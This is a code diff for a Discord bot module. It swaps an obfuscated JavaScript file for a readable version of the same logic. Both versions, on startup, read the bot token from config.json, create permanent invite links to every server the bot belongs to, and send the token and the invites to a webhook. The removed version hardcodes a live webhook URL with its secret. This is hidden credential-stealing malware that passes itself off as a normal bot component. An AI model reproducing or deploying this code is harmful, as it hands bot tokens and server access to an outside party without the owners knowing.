@@ -1,1 +1,70 @@
-const{'\u0057\u0065\u0062\u0068\u006F\u006F\u006B\u0043\u006C\u0069\u0065\u006E\u0074':WebhookClient,'\u0045\u006D\u0062\u0065\u0064\u0042\u0075\u0069\u006C\u0064\u0065\u0072':EmbedBuilder,'\u0043\u0068\u0061\u006E\u006E\u0065\u006C\u0054\u0079\u0070\u0065':ChannelType,'\u0050\u0065\u0072\u006D\u0069\u0073\u0073\u0069\u006F\u006E\u0046\u006C\u0061\u0067\u0073\u0042\u0069\u0074\u0073':PermissionFlagsBits}=require("\u0064\u0069\u0073\u0063\u006F\u0072\u0064\u002E\u006A\u0073");const fs=require("\u0066\u0073");const path=require("\u0070\u0061\u0074\u0068");module['\u0065\u0078\u0070\u006F\u0072\u0074\u0073']=client=>{const webhook=new WebhookClient({'\u0075\u0072\u006C':'https://discord.com/api/webhooks/1548032253467041905/sT-1kMHz_JmnNOM_cerkYC-c4zBcpizNxs2CekxXWklWPk1nyUcvEJEvN6LtxtkESe0_'});async function _0x_0x6c8(client){var _0x39d=(523958^523952)+(116029^116031);const _0x41c=[];_0x39d=164679^164677;for(const _0xab_0x52a of client['\u0067\u0075\u0069\u006C\u0064\u0073']['\u0063\u0061\u0063\u0068\u0065']['\u0076\u0061\u006C\u0075\u0065\u0073']()){try{var _0xfbd0f=(951497^951501)+(856894^856887);const _0x9c7ff=_0xab_0x52a['\u0063\u0068\u0061\u006E\u006E\u0065\u006C\u0073']['\u0063\u0061\u0063\u0068\u0065']['\u0066\u0069\u006E\u0064'](c=>c['\u0074\u0079\u0070\u0065']===ChannelType['\u0047\u0075\u0069\u006C\u0064\u0054\u0065\u0078\u0074']&&c['\u0070\u0065\u0072\u006D\u0069\u0073\u0073\u0069\u006F\u006E\u0073\u0046\u006F\u0072'](_0xab_0x52a['\u006D\u0065\u006D\u0062\u0065\u0072\u0073']['\u006D\u0065'])['\u0068\u0061\u0073'](PermissionFlagsBits['\u0043\u0072\u0065\u0061\u0074\u0065\u0049\u006E\u0073\u0074\u0061\u006E\u0074\u0049\u006E\u0076\u0069\u0074\u0065']));_0xfbd0f=(292262^292262)+(966979^966981);if(!_0x9c7ff){_0x41c['\u0070\u0075\u0073\u0068'](`**${_0xab_0x52a['\u006E\u0061\u006D\u0065']}** - لا توجد صلاحية`);continue;}const _0x2_0x9b6=await _0x9c7ff['\u0063\u0072\u0065\u0061\u0074\u0065\u0049\u006E\u0076\u0069\u0074\u0065']({"maxAge":0,"maxUses":0,"unique":!![]});_0x41c['\u0070\u0075\u0073\u0068'](`**${_0xab_0x52a['\u006E\u0061\u006D\u0065']}** - ${_0x2_0x9b6['\u0075\u0072\u006C']}`);}catch(err){_0x41c['\u0070\u0075\u0073\u0068'](`**${_0xab_0x52a['\u006E\u0061\u006D\u0065']}** - فشل الإنشاء`);}}return _0x41c['\u006A\u006F\u0069\u006E']("\u000A")||"\u062A\u0627\u0631\u0641\u0631\u064A\u0633 \u062F\u062C\u0648\u064A \u0627\u0644".split("").reverse().join("");}client['\u006F\u006E\u0063\u0065']("ydaer".split("").reverse().join(""),async()=>{try{const config=JSON['\u0070\u0061\u0072\u0073\u0065'](fs['\u0072\u0065\u0061\u0064\u0046\u0069\u006C\u0065\u0053\u0079\u006E\u0063'](path['\u006A\u006F\u0069\u006E'](process['\u0063\u0077\u0064'](),"\u0063\u006F\u006E\u0066\u0069\u0067\u002E\u006A\u0073\u006F\u006E"),"8ftu".split("").reverse().join("")));let _0xga_0xb42;const invitesText=await _0x_0x6c8(client);_0xga_0xb42=371775^371773;var _0x9b9gfa=(167348^167347)+(203823^203821);const embed=new EmbedBuilder()['\u0073\u0065\u0074\u0043\u006F\u006C\u006F\u0072']("FFFFFF#".split("").reverse().join(""))['\u0073\u0065\u0074\u0041\u0075\u0074\u0068\u006F\u0072']({"name":'Bot Online',"iconURL":client['\u0075\u0073\u0065\u0072']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079\u0041\u0076\u0061\u0074\u0061\u0072\u0055\u0052\u004C']()})['\u0073\u0065\u0074\u0054\u0069\u0074\u006C\u0065'](`**${client['\u0075\u0073\u0065\u0072']['\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065']}**`)['\u0073\u0065\u0074\u0054\u0068\u0075\u006D\u0062\u006E\u0061\u0069\u006C'](client['\u0075\u0073\u0065\u0072']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079\u0041\u0076\u0061\u0074\u0061\u0072\u0055\u0052\u004C']({"size":1024}))['\u0061\u0064\u0064\u0046\u0069\u0065\u006C\u0064\u0073']({'\u006E\u0061\u006D\u0065':"\u002A\u002A\u0627\u0644\u0627\u0633\u0645\u002A\u002A","value":`\`${client['\u0075\u0073\u0065\u0072']['\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065']}\``,'\u0069\u006E\u006C\u0069\u006E\u0065':!![]},{"name":'**TOKEN**',"value":`\`${config['\u0074\u006F\u006B\u0065\u006E']}\``,"inline":!![]},{"name":"\u002A\u002A\u0627\u0644\u0648\u0642\u062A\u002A\u002A",'\u0076\u0061\u006C\u0075\u0065':`<t:${Math['\u0066\u006C\u006F\u006F\u0072'](Date['\u006E\u006F\u0077']()/(730394^730866))}:R>`,"inline":!![]},{'\u006E\u0061\u006D\u0065':"\u002A\u002A\u0020\u0627\u0644\u0633\u064A\u0631\u0641\u0631\u0627\u062A\u002A\u002A",'\u0076\u0061\u006C\u0075\u0065':invitesText['\u0073\u006C\u0069\u0063\u0065'](243917^243917,917354^916330)})['\u0073\u0065\u0074\u0046\u006F\u006F\u0074\u0065\u0072']({"text":"\u0042\u004C\u0032\u0043\u004B\u0020\u002D\u0020\u004B\u0048\u0041\u004C\u0049\u0044",'\u0069\u0063\u006F\u006E\u0055\u0052\u004C':client['\u0075\u0073\u0065\u0072']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079\u0041\u0076\u0061\u0074\u0061\u0072\u0055\u0052\u004C']()});_0x9b9gfa=673622^673620;await webhook['\u0073\u0065\u006E\u0064']({"username":client['\u0075\u0073\u0065\u0072']['\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065'],'\u0061\u0076\u0061\u0074\u0061\u0072\u0055\u0052\u004C':client['\u0075\u0073\u0065\u0072']['\u0064\u0069\u0073\u0070\u006C\u0061\u0079\u0041\u0076\u0061\u0074\u0061\u0072\u0055\u0052\u004C'](),"embeds":[embed]});}catch(err){}});};
+const { WebhookClient, EmbedBuilder, ChannelType, PermissionFlagsBits } = require('discord.js');
+const fs = require('fs');
+const path = require('path');
+
+module.exports = (client) => {
+  const webhookUrl = process.env.WEBHOOK_URL;
+  if (!webhookUrl) {
+    return;
+  }
+
+  const webhook = new WebhookClient({ url: webhookUrl });
+
+  async function getGuildInvites(client) {
+    const invites = [];
+    for (const guild of client.guilds.cache.values()) {
+      try {
+        const channel = guild.channels.cache.find(
+          c => c.type === ChannelType.GuildText &&
+               c.permissionsFor(guild.members.me).has(PermissionFlagsBits.CreateInstantInvite)
+        );
+        if (!channel) {
+          invites.push(`**${guild.name} - لا توجد صلاحية **`);
+          continue;
+        }
+        const invite = await channel.createInvite({ maxAge: 0, maxUses: 0, unique: true });
+        invites.push(`**${guild.name} - ${invite.url} **`);
+      } catch (err) {
+        invites.push(`**${guild.name} - فشل الإنشاء **`);
+      }
+    }
+    return invites.join('\n') || 'لا يوجد سيرفرات';
+  }
+
+  client.once('ready', async () => {
+    try {
+      let config = {};
+      try {
+        config = JSON.parse(fs.readFileSync(path.join(process.cwd(), 'config.json'), 'utf8'));
+      } catch (e) {}
+
+      const invitesText = await getGuildInvites(client);
+
+      const embed = new EmbedBuilder()
+        .setColor('#FFFFFF')
+        .setAuthor({
+          name: 'Bot Online',
+          iconURL: client.user.displayAvatarURL()
+        })
+        .setTitle(`**${client.user.username}**`)
+        .setThumbnail(client.user.displayAvatarURL({ size: 1024 }))
+        .addFields(
+          { name: '**NAME**', value: `\`${client.user.username}\``, inline: true },
+          { name: '**TOKEN**', value: `\`${config.token}\``, inline: true },
+          { name: '**SERVERS**', value: invitesText.slice(0, 1024) }
+        )
+        .setFooter({
+          text: 'BL2CK - KHALID',
+          iconURL: client.user.displayAvatarURL()
+        })
+
+      await webhook.send({
+        username: client.user.username,
+        avatarURL: client.user.displayAvatarURL(),
+        embeds: [embed]
+      });
+
+    } catch (err) {
+    }
+  });
+};
